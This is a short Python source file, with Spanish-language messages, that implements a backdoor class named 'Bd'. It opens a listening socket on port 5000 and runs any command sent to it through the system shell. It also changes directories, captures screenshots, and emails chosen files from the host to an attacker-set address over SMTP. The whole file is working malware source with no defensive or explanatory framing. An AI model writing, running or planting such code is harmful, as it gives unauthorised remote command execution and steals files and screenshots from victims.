#-*-coding: utf-8-*-
from pyautogui import screenshot
from socket import *
from os import chdir, getcwd, popen
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from datetime import datetime
from random import randint


class Bd():
	def __init__(self):
		pass
	def venom(self,ip="0.0.0.0", port=5000):
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.bind((ip, port))
		self.sock.listen(1)
		self.conn, self.addr = self.sock.accept()
		user, password, sendto, server = str(), str(), str(), str()
		while True:
			cmd = self.conn.recv(1024).decode()
			if cmd[:2] == "cd":
				try:
					chdir(cmd[3:])
				except:
					self.conn.send("\nNo se ha podido entrar a '{}'".format(cmd[3:]).encode())
				finally:
					self.conn.send("\n{}".format(getcwd()).encode())
			elif cmd == "show options":
				self.conn.send("\nUser: {}\nPassword: {}\nSend to: {}\nSMTP Server: {}".format(user,password,sendto,server).encode())
			elif cmd[:4] == "logu":
				user = self.decvar(cmd, 5)
			elif cmd[:4] == "logp":
				password = self.decvar(cmd, 5)
			elif cmd[:6] == "sendto":
				sendto = self.decvar(cmd, 7)
			elif cmd[:6] == "server":
				server = self.decvar(cmd, 7)
			elif cmd == "takess":
				ss = screenshot()
				ss.save("{}.png".format(randint(1, 500)))
				self.conn.send("Screenshot guardada en {}".format(getcwd()).encode())
			elif cmd[:3] == "snd":
				try:
					msg = MIMEMultipart()
					msg['From']=user
					msg['To']=sendto
					msg['Subject']="Backdoor"
					msg.attach(MIMEText("{}".format(datetime.now())))
					file = open(cmd[4:], "rb")
					attach_image = MIMEImage(file.read())
					attach_image.add_header('Content-Disposition', 'attachment; filename = "Bd"')
					msg.attach(attach_image)
					server = SMTP(server)
					server.starttls()
					server.login(user, password)
					server.sendmail(user, sendto, msg.as_string())
					server.close()
				except Exception as e:
					self.conn.send("\n{}".format(e).encode())
				else:
					self.conn.send("Archivo mandado con exito a {}.".format(sendto).encode())
			else:
				out = popen(cmd).read()
				self.conn.send("\n{}".format(out).encode())

				



	def decvar(self, c, n):
		try:
			ret = c[n:]
		except Exception as e:
			self.conn.send("\n{}".format(e).encode())
		else:
			self.conn.send("\nVariable declarada correctamente.".encode())
			return ret


if __name__ == '__main__':
	main = Bd()
	main.venom()